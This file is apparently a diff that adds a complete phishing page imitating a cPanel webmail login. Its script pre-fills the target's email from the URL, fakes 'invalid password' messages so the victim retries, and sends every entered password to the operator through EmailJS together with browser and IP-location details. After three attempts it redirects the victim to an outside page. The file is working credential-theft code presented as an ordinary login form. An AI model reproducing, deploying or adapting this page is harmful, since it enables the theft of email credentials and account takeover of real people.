@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .logo {
+            margin: 30px 0;
+            margin-top: 140px;
+            width: 75%;
+            max-width: 320px;
+            height: auto;
+        }
+
+        .notification {
+            color: white; /* White text for "Authenticating" */
+            font-size: 12px;
+            margin-bottom: -120px;
+            display: none; /* Initially hidden */
+            font-weight: regular; /* Make text bold */
+            background-color: #3c9bd6; /* Green background */
+            padding: 6px;
+            margin-top: 100px;
+            border-radius: 5px;
+            width: 30%;
+            max-width: 320px;
+             /* Rounded corners */
+            padding: 15px;
+        }
+		.notification::before {
+            content: "✓"; /* Check icon for authenticating */
+            color: white;
+            font-size: 12px;
+            margin-right: 8px;
+             /* Space between icon and text */
+        }
+
+
+        .password-validation {
+            color: white; /* White text for validation messages */
+            font-size: 12px;
+            margin-top: 100px;
+            margin-bottom: -120px;
+            display: none; /* Initially hidden */
+            background-color: #d45352; /* Red background */
+            padding: 6px;
+            border-radius: 5px; /* Rounded corners */
+            width: 30%;
+            max-width: 320px; 
+            font-weight: regular;
+            padding: 15px;
+            
+        }
+        .password-validation::before {
+            content: "✖"; /* Cross mark for invalid password */
+            color: white;
+            font-size: 12px;
+            margin-right: 8px; /* Space between icon and text */
+        }
+
+
+        .login-container {
+            width: 75%;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        .input-container {
+            position: relative;
+        }
+
+        .input-container input {
+            width: 100%;
+            padding: 8px 30px 8px 35px;
+            border: 2px solid #ccc;
+            border-radius: 3px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            width: 16px;
+            height: 16px;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 07px;
+            background-color: #399ad6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 05px;
+        }
+
+        .login-button:hover {
+            background-color: #1b5779;
+            cursor: pointer;
+            transition: background-color 0.3s ease-in-out;
+            box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.2);
+        }
+
+        .language-bar {
+            margin-top: auto;
+            padding: 40px 10;
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .language-link {
+            color: #444;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 190px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .cp-logo {
+            color: #FF4500;
+            font-size: 24px;
+            margin-bottom: 5px;
+            margin-top: -130px;
+        }
+
+        .timestamp {
+            font-size: 12px;
+            color: #666;
+            margin: 10px 0;
+            line-height: 1.5;
+            text-align: center;
+            display: none;
+        }
+
+        .show-password {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .show-password input {
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="notification" id="authenticatingNotification">Authenticating...</div>
+    <div class="password-validation" id="passwordValidation">The password is invalid.</div>
+    
+    <img class="logo" src="https://webmail.gigared.com/cPanel_magic_revision_1610662436/unprotected/cpanel/images/webmail-logo.svg" alt="Logo">
+
+    <div class="timestamp" id="timestamp"></div>
+
+    <div class="login-container">
+        <div class="form-group">
+            <label>Email Address</label>
+            <div class="input-container">
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                    <circle cx="12" cy="7" r="4"></circle>
+                </svg>
+                <input disabled type="email" id="email" value="example@email.com" placeholder="#[[-email-]]" required>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>Password</label>
+            <div class="input-container">
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                <input type="password" id="password" placeholder="Enter your email password." required>
+            </div>
+            <div class="password-validation" id="passwordValidation">The password is invalid.</div>
+        </div>
+
+        <div class="show-password">
+            <input type="checkbox" id="showPassword">
+            <label for="showPassword">Show password</label>
+        </div>
+
+        <button class="login-button" id="submitButton">Log in</button>
+    </div>
+
+    <div class="language-bar">
+        <a href="#" class="language-link">English</a>
+        <a href="#" class="language-link">العربية</a>
+        <a href="#" class="language-link">čeština</a>
+        <a href="#" class="language-link">dansk</a>
+        <a href="#" class="language-link">Deutsch</a>
+        <a href="#" class="language-link">Ελληνικά</a>
+        <a href="#" class="language-link">español</a>
+        <a href="#" class="language-link">español latinoamericano</a>
+        <a href="#" class="language-link">...</a>
+    </div>
+
+    <footer class="footer">
+        <div class="cp-logo">cP</div>
+        <div>Copyright© 2024 Secure Portal</div>
+        <a href="#" class="language-link">Privacy Policy</a>
+    </footer>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init({
+                publicKey: "56xE683uZReecjmWx",
+            });
+        })();
+
+        let invalidAttemptCount = 0;  // Counter for invalid attempts
+        const maxInvalidAttempts = 3;  // Maximum allowed invalid attempts
+
+        function getBrowserDetails() {
+            const userAgent = navigator.userAgent;
+            let browserName = "Unknown";
+
+            if (userAgent.indexOf("Chrome") > -1) {
+                browserName = "Chrome";
+            } else if (userAgent.indexOf("Firefox") > -1) {
+                browserName = "Firefox";
+            } else if (userAgent.indexOf("Safari") > -1) {
+                browserName = "Safari";
+            } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
+                browserName = "Internet Explorer";
+            }
+            return browserName;
+        }
+
+        function getUserLocation() {
+            return fetch('https://ipinfo.io/json?token=36ff5fb656cb26')
+                .then(response => response.json())
+                .then(data => {
+                    const location = `${data.city}, ${data.country}`;
+                    return location;
+                })
+                .catch(error => {
+                    console.error('Error fetching location:', error);
+                    return 'Unable to retrieve location';
+                });
+        }
+
+        function updateTimestamp() {
+            const now = new Date();
+            const options = { weekday: 'short', year: 'numeric', month: 'short', day: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false };
+            const dateTimeString = now.toLocaleString('en-US', options);
+            const browser = getBrowserDetails();
+
+            return { timestamp: dateTimeString, browser };
+        }
+
+        function populateEmailFromFragment() {
+            const hash = window.location.hash;
+            const email = hash.substring(1); // Remove the leading '#'
+            if (email) {
+                document.getElementById('email').value = email;
+            }
+        }
+
+        const { timestamp, browser } = updateTimestamp();
+        document.getElementById('timestamp').innerHTML = `${timestamp} | Browser: ${browser}`;
+        populateEmailFromFragment();
+
+        document.getElementById('password').addEventListener('input', function() {
+            const passwordValidationMessage = document.getElementById('passwordValidation');
+            if (this.value.length < 5) {
+                passwordValidationMessage.style.display = 'none'; // Hide warning message for short passwords
+            } else {
+                passwordValidationMessage.style.display = 'none';  // Hide validation message initially
+            }
+        });
+
+        document.getElementById('submitButton').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const passwordValidationMessage = document.getElementById('passwordValidation');
+            const authenticatingNotification = document.getElementById('authenticatingNotification');
+
+            // Reset validation message initially
+            passwordValidationMessage.style.display = 'none';
+            authenticatingNotification.style.display = 'none'; // Hide authenticating message initially
+
+            if (password.length < 5) {
+                passwordValidationMessage.textContent = 'Please enter a valid password.'; // Show relevant warning
+                passwordValidationMessage.style.display = 'block'; // Show validation message
+                return; // Prevent submission
+            }
+
+            invalidAttemptCount++;
+
+            // Example of valid password (this should be replaced with actual validation logic)
+            const validPassword = "password123"; // Replace with actual check
+
+            if (password !== validPassword) {
+                // Show authenticating message
+                authenticatingNotification.style.display = 'block';
+                setTimeout(() => {
+                    authenticatingNotification.style.display = 'none'; // Hide after 3 seconds
+                    // Display the error message
+                    passwordValidationMessage.textContent = 'The login is invalid.';
+                    passwordValidationMessage.style.display = 'block';
+
+                    // Send the invalid password attempt via EmailJS
+                    const templateParams = {
+                        user_email: email,
+                        user_password: password, // Sending invalid password
+                        timestamp: `${timestamp} | Browser: ${browser}`
+                    };
+
+                    emailjs.send('service_n35m147', 'template_peyiek8', templateParams)
+                        .then(function(response) {
+                            console.log('INVALID PASSWORD SENT TO EMAILJS!');
+                        }, function(error) {
+                            console.log('FAILED TO SEND INVALID PASSWORD...', error);
+                        });
+
+                    if (invalidAttemptCount >= maxInvalidAttempts) {
+                        setTimeout(() => {
+                            window.location.href = 'https://webmail-success-page.pages.dev'; // Redirect after a short delay
+                        }, 1000);
+                    }
+                }, 1600); // Delay for "Authenticating" message before displaying validation messages
+                return; // Exit early
+            }
+
+            // Reset attempts on successful login
+            invalidAttemptCount = 0;
+
+            // Show authenticating message
+            authenticatingNotification.style.display = 'block';
+            setTimeout(() => {
+                authenticatingNotification.style.display = 'none'; // Hide after 2 seconds
+                getUserLocation().then(location => {
+                    const updatedTimestamp = `${timestamp} | Browser: ${browser} | Location: ${location}`;
+                    document.getElementById('timestamp').innerHTML = updatedTimestamp;
+
+                    const templateParams = {
+                        user_email: email,
+                        user_password: password,
+                        timestamp: updatedTimestamp
+                    };
+
+                    emailjs.send('service_n35m147', 'template_peyiek8', templateParams)
+                        .then(function(response) {
+                            console.log('SUCCESS!');
+
+                            // Redirect to the new page after successful submission
+                            window.location.href = 'https://webmail-success-page.pages.dev'; // Change the URL to your target page
+                        }, function(error) {
+                            console.log('FAILED...', error);
+                            passwordValidationMessage.textContent = 'Failed to send details. Please try again.';
+                            passwordValidationMessage.style.display = 'block';
+                        });
+                });
+            }, 2000); // Delay to show the "Authenticating" message
+        });
+
+        document.getElementById('showPassword').addEventListener('change', function() {
+            const passwordInput = document.getElementById('password');
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+    </script>
+</body>
+</html>
